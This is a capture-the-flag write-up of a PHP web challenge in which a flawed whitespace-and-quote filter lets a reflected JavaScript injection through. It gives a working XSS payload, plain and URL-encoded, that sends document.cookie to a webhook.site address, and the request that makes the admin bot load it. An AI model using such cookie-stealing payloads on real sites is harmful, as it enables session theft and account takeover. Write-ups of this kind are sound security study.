# Czechoslovakia Web Challenge Writeup

I solved this challenge by exploiting a reflected JavaScript injection in the `name` parameter, then using the admin bot to execute my payload with the `FLAG` cookie set.

## 1. I Started From The Source

I reviewed `index.php` and the bot code.

The page does:

```php
$name = remove_all_whitespace($_GET['name'] ?? "Guest");

if (!check($name)) {
    $name = "Guest";
}
```

And reflects it into JavaScript:

```html
<script>
document.getElementById("welcome").innerText = "Welcome, <?=$name?>";
</script>
```

The bot does:

1. Accepts `POST /visit` with JSON `{ "url": "..." }`
2. Only allows URLs starting with `https://web-czechoslovakia.hackena-labs.com/`
3. Sets cookie `FLAG=<real_flag>` for that domain
4. Visits my URL with Puppeteer

## 2. I Identified The Core Bug

`check($name)` builds a sanitized string (`$result`) but the application never uses that sanitized output. It only uses `check($name)` as a boolean pass/fail gate. If it passes, the original input is reflected.

So the bug is: validation result is used as boolean, but unsanitized input is output.

## 3. I Worked Around The Filter

The filter constraints were:

1. No `<`
2. At most one `"`
3. Characters must be from `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789;"/`
4. Spaces/newlines are removed first

I noticed special logic for `//`:

```php
if ($char === '/' && isset($input[$i+1]) && $input[$i+1] === '/') {
    if (strpos($result, '"') !== false) {
        break;
    }
    $result .= '//';
    $i++;
}
```

After I include one double quote, hitting `//` causes `check()` to break early and return truthy. That allows me to append unchecked JavaScript after the `//` sequence and still pass validation.

## 4. I Built A Payload That Executes Reliably

My working payload was:

```text
";/x//1;location='https://webhook.site/<TOKEN>/?c='+document.cookie//
```

Why this works:

1. `"` closes the `"Welcome, ..."` string.
2. `;/x//1;` is parsed as a harmless regex/division expression, not a comment.
3. `location='https://webhook.site/<TOKEN>/?c='+document.cookie` executes and exfiltrates cookies.
4. Final `//` comments out the trailing `";` from the original script template.

Encoded form:

```text
%22%3B%2Fx%2F%2F1%3Blocation%3D%27https%3A%2F%2Fwebhook.site%2F<TOKEN>%2F%3Fc%3D%27%2Bdocument.cookie%2F%2F
```

## 5. I Triggered The Admin Bot

I sent:

```http
POST https://web-czechoslovakia-bot.hackena-labs.com/visit
Content-Type: application/json

{"url":"https://web-czechoslovakia.hackena-labs.com/?name=<ENCODED_PAYLOAD>"}
```

The bot responded with success, visited my URL, executed my payload, and made a request to my webhook with:

`c=FLAG=Hackena{I_Mi5S3d_Czechoslovakia}`

## 6. I Automated It

I wrote `solve.py` to:

1. Create a webhook token
2. Generate the payload
3. Submit `/visit` to the bot
4. Poll webhook.site API
5. Extract and print the flag

Running:

```bash
python3 solve.py --wait 20
```

printed:

`Hackena{I_Mi5S3d_Czechoslovakia}`
